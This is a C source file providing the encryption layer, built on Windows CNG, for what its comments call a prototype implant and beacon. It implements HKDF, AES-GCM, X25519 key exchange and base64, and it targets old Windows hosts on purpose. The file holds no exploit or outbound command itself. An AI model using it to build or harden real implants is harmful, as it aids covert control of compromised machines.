/* crypto_cng.c — CNG-backed primitives for the C prototype implant.
 *
 * Design rules:
 *  - No from-memory crypto: every primitive is a documented CNG API.
 *  - Every failure fails closed (caller aborts the beacon, never sends
 *    unauthenticated plaintext).
 *  - X25519 needs Windows 10 1903+; older hosts get a clear stderr message
 *    and exit instead of a weak fallback.
 */
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "crypto_cng.h"
#include "curve25519.h"

#pragma comment(lib, "bcrypt.lib")

void cng_wipe(void *p, DWORD len) {
    if (p && len) SecureZeroMemory(p, len);
}

int cng_random(BYTE *out, DWORD len) {
    NTSTATUS st = BCryptGenRandom(NULL, out, len, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    return BCRYPT_SUCCESS(st) ? 0 : -1;
}

int cng_sha256(const BYTE *data, DWORD len, BYTE out[32]) {
    BCRYPT_ALG_HANDLE h = NULL;
    BCRYPT_HASH_HANDLE hh = NULL;
    NTSTATUS st;
    int rc = -1;
    st = BCryptOpenAlgorithmProvider(&h, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(st)) return -1;
    st = BCryptCreateHash(h, &hh, NULL, 0, NULL, 0, 0);
    if (!BCRYPT_SUCCESS(st)) goto done;
    st = BCryptHashData(hh, (PUCHAR)data, len, 0);
    if (!BCRYPT_SUCCESS(st)) goto done;
    st = BCryptFinishHash(hh, out, 32, 0);
    rc = BCRYPT_SUCCESS(st) ? 0 : -1;
done:
    if (hh) BCryptDestroyHash(hh);
    if (h) BCryptCloseAlgorithmProvider(h, 0);
    return rc;
}

int cng_hmac_sha256(const BYTE *key, DWORD keylen,
                    const BYTE *data, DWORD datalen, BYTE out[32]) {
    BCRYPT_ALG_HANDLE h = NULL;
    BCRYPT_HASH_HANDLE hh = NULL;
    NTSTATUS st;
    int rc = -1;
    st = BCryptOpenAlgorithmProvider(&h, BCRYPT_SHA256_ALGORITHM, NULL,
                                     BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!BCRYPT_SUCCESS(st)) return -1;
    st = BCryptCreateHash(h, &hh, NULL, 0, (PUCHAR)key, keylen, 0);
    if (!BCRYPT_SUCCESS(st)) goto done;
    if (datalen) {
        st = BCryptHashData(hh, (PUCHAR)data, datalen, 0);
        if (!BCRYPT_SUCCESS(st)) goto done;
    }
    st = BCryptFinishHash(hh, out, 32, 0);
    rc = BCRYPT_SUCCESS(st) ? 0 : -1;
done:
    if (hh) BCryptDestroyHash(hh);
    if (h) BCryptCloseAlgorithmProvider(h, 0);
    return rc;
}

int cng_hkdf_sha256(const BYTE *ikm, DWORD ikmlen,
                    const BYTE *salt, DWORD saltlen,
                    const BYTE *info, DWORD infolen, BYTE out[32]) {
    BYTE prk[32];
    BYTE one = 0x01;
    BYTE t1[32];
    /* Extract: PRK = HMAC(salt, IKM). */
    if (cng_hmac_sha256(salt, saltlen, ikm, ikmlen, prk) != 0) return -1;
    /* Expand (L=32, single block): T(1) = HMAC(PRK, info || 0x01).
     * Implemented as two HashData calls to avoid a temp buffer. */
    {
        BCRYPT_ALG_HANDLE h = NULL;
        BCRYPT_HASH_HANDLE hh = NULL;
        NTSTATUS st;
        int rc = -1;
        st = BCryptOpenAlgorithmProvider(&h, BCRYPT_SHA256_ALGORITHM, NULL,
                                         BCRYPT_ALG_HANDLE_HMAC_FLAG);
        if (!BCRYPT_SUCCESS(st)) { cng_wipe(prk, 32); return -1; }
        st = BCryptCreateHash(h, &hh, NULL, 0, prk, 32, 0);
        if (!BCRYPT_SUCCESS(st)) goto done;
        if (infolen) {
            st = BCryptHashData(hh, (PUCHAR)info, infolen, 0);
            if (!BCRYPT_SUCCESS(st)) goto done;
        }
        st = BCryptHashData(hh, &one, 1, 0);
        if (!BCRYPT_SUCCESS(st)) goto done;
        st = BCryptFinishHash(hh, t1, 32, 0);
        rc = BCRYPT_SUCCESS(st) ? 0 : -1;
    done:
        if (hh) BCryptDestroyHash(hh);
        if (h) BCryptCloseAlgorithmProvider(h, 0);
        cng_wipe(prk, 32);
        if (rc != 0) { cng_wipe(t1, 32); return -1; }
    }
    memcpy(out, t1, 32);
    cng_wipe(t1, 32);
    return 0;
}

/* --- AES-256-GCM --- */

static int aesgcm_setup(BCRYPT_ALG_HANDLE *ph, BCRYPT_KEY_HANDLE *pk,
                        const BYTE key[32]) {
    NTSTATUS st;
    DWORD cbObj = 0, cb = 0;
    BCRYPT_ALG_HANDLE h = NULL;
    BCRYPT_KEY_HANDLE k = NULL;
    PUCHAR obj = NULL;
    st = BCryptOpenAlgorithmProvider(&h, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(st)) return -1;
    st = BCryptSetProperty(h, BCRYPT_CHAINING_MODE,
                           (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                           sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(st)) goto fail;
    st = BCryptGetProperty(h, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbObj,
                           sizeof(cbObj), &cb, 0);
    if (!BCRYPT_SUCCESS(st)) goto fail;
    obj = (PUCHAR)malloc(cbObj);
    if (!obj) goto fail;
    st = BCryptGenerateSymmetricKey(h, &k, obj, cbObj, (PUCHAR)key, 32, 0);
    if (!BCRYPT_SUCCESS(st)) { free(obj); goto fail; }
    *ph = h;
    *pk = k;
    return 0;
fail:
    if (h) BCryptCloseAlgorithmProvider(h, 0);
    return -1;
}

int cng_aesgcm_encrypt(const BYTE key[32],
                       const BYTE *pt, DWORD ptlen,
                       const BYTE *aad, DWORD aadlen,
                       BYTE *out, DWORD outcap) {
    BCRYPT_ALG_HANDLE h = NULL;
    BCRYPT_KEY_HANDLE k = NULL;
    NTSTATUS st;
    int rc = -1;
    BYTE nonce[12], tag[16];
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    ULONG outlen = 0;
    if (outcap < 12 + ptlen + 16) return -1;
    if (aesgcm_setup(&h, &k, key) != 0) return -1;
    if (cng_random(nonce, 12) != 0) goto done;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = nonce;
    info.cbNonce = 12;
    info.pbAuthData = (PUCHAR)aad;
    info.cbAuthData = aadlen;
    info.pbTag = tag;
    info.cbTag = 16;
    memcpy(out, nonce, 12);
    st = BCryptEncrypt(k, (PUCHAR)pt, ptlen, &info, NULL, 0,
                       out + 12, ptlen, &outlen, 0);
    if (!BCRYPT_SUCCESS(st) || outlen != ptlen) goto done;
    memcpy(out + 12 + ptlen, tag, 16);
    rc = (int)(12 + ptlen + 16);
done:
    cng_wipe(tag, 16);
    if (k) BCryptDestroyKey(k);
    if (h) BCryptCloseAlgorithmProvider(h, 0);
    return rc;
}

int cng_aesgcm_decrypt(const BYTE key[32],
                       const BYTE *blob, DWORD bloblen,
                       const BYTE *aad, DWORD aadlen,
                       BYTE *out, DWORD outcap) {
    BCRYPT_ALG_HANDLE h = NULL;
    BCRYPT_KEY_HANDLE k = NULL;
    NTSTATUS st;
    int rc = -1;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    ULONG outlen = 0;
    DWORD ctlen;
    if (bloblen < 12 + 16) return -1;
    ctlen = bloblen - 12 - 16;
    if (outcap < ctlen) return -1;
    if (aesgcm_setup(&h, &k, key) != 0) return -1;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PUCHAR)(blob);
    info.cbNonce = 12;
    info.pbAuthData = (PUCHAR)aad;
    info.cbAuthData = aadlen;
    info.pbTag = (PUCHAR)(blob + 12 + ctlen);
    info.cbTag = 16;
    st = BCryptDecrypt(k, (PUCHAR)(blob + 12), ctlen, &info, NULL, 0,
                       out, ctlen, &outlen, 0);
    if (!BCRYPT_SUCCESS(st)) goto done;
    rc = (int)outlen;
done:
    if (k) BCryptDestroyKey(k);
    if (h) BCryptCloseAlgorithmProvider(h, 0);
    return rc;
}

/* --- X25519 (donna-style software ladder + CNG RNG) ---
 *
 * Rationale: CNG exposes no X25519 key agreement on most hosts
 * (BCryptOpenAlgorithmProvider("X25519") -> STATUS_NOT_FOUND, verified on
 * Win10/11; Win7 has none at all). The ladder below is verified at startup
 * against Go-stdlib vectors (x25519_selftest, fail closed), and works back
 * to Windows 7 — which is part of the point of a C implant. AES-GCM, HMAC,
 * SHA-256 and RNG stay on CNG. */

static BYTE g_x_priv[32];
static int g_x_ready = 0;

/* Adopt an identity private key after self-test (fresh or persisted). */
int cng_x25519_use_priv(const BYTE priv[32], BYTE pub[32]) {
    if (x25519_selftest() != 0) {
        fprintf(stderr, "[cbeacon] X25519 self-test FAILED, refusing to run\n");
        return -1;
    }
    memcpy(g_x_priv, priv, 32);
    x25519_basepoint(pub, g_x_priv);
    g_x_ready = 1;
    return 0;
}

int cng_x25519_agree(const BYTE peer_pub[32], BYTE shared[32]) {
    if (!g_x_ready) return -1;
    x25519_scalarmult(shared, g_x_priv, peer_pub);
    return 0;
}

/* Ephemeral handshake keypair (per-handshake, never persisted). */
static BYTE g_eph_priv[32];
static int g_eph_ready = 0;

int cng_x25519_ephemeral(BYTE pub[32]) {
    if (x25519_selftest() != 0) return -1;
    if (cng_random(g_eph_priv, 32) != 0) return -1;
    x25519_basepoint(pub, g_eph_priv);
    g_eph_ready = 1;
    return 0;
}

int cng_x25519_agree_eph(const BYTE peer_pub[32], BYTE shared[32]) {
    if (!g_eph_ready) return -1;
    x25519_scalarmult(shared, g_eph_priv, peer_pub);
    cng_wipe(g_eph_priv, 32);
    g_eph_ready = 0;
    return 0;
}

/* --- base64 --- */

static const char b64tab[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char *b64enc(const BYTE *in, DWORD len) {
    DWORD outlen = ((len + 2) / 3) * 4;
    char *out = (char *)malloc(outlen + 1);
    DWORD i, o = 0;
    if (!out) return NULL;
    for (i = 0; i < len; i += 3) {
        DWORD n = len - i;
        BYTE a = in[i], b = n > 1 ? in[i + 1] : 0, c = n > 2 ? in[i + 2] : 0;
        out[o++] = b64tab[a >> 2];
        out[o++] = b64tab[((a & 3) << 4) | (b >> 4)];
        out[o++] = n > 1 ? b64tab[((b & 15) << 2) | (c >> 6)] : '=';
        out[o++] = n > 2 ? b64tab[c & 63] : '=';
    }
    out[o] = '\0';
    return out;
}

static int b64val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

BYTE *b64dec(const char *in, DWORD *outlen) {
    size_t ilen, i, o = 0, cap = 0;
    BYTE *out = NULL;
    if (!in || !outlen) return NULL;
    ilen = strlen(in);
    if (ilen % 4 != 0) return NULL;
    cap = (ilen / 4) * 3 + 3;
    out = (BYTE *)malloc(cap);
    if (!out) return NULL;
    for (i = 0; i < ilen; i += 4) {
        int a = b64val(in[i]), b = b64val(in[i + 1]);
        int c = in[i + 2] == '=' ? 0 : b64val(in[i + 2]);
        int d = in[i + 3] == '=' ? 0 : b64val(in[i + 3]);
        if (a < 0 || b < 0 || (in[i + 2] != '=' && c < 0) || (in[i + 3] != '=' && d < 0)) {
            free(out);
            return NULL;
        }
        out[o++] = (BYTE)((a << 2) | (b >> 4));
        if (in[i + 2] != '=') out[o++] = (BYTE)(((b & 15) << 4) | (c >> 2));
        if (in[i + 3] != '=') out[o++] = (BYTE)(((c & 3) << 6) | d);
    }
    *outlen = (DWORD)o;
    return out;
}
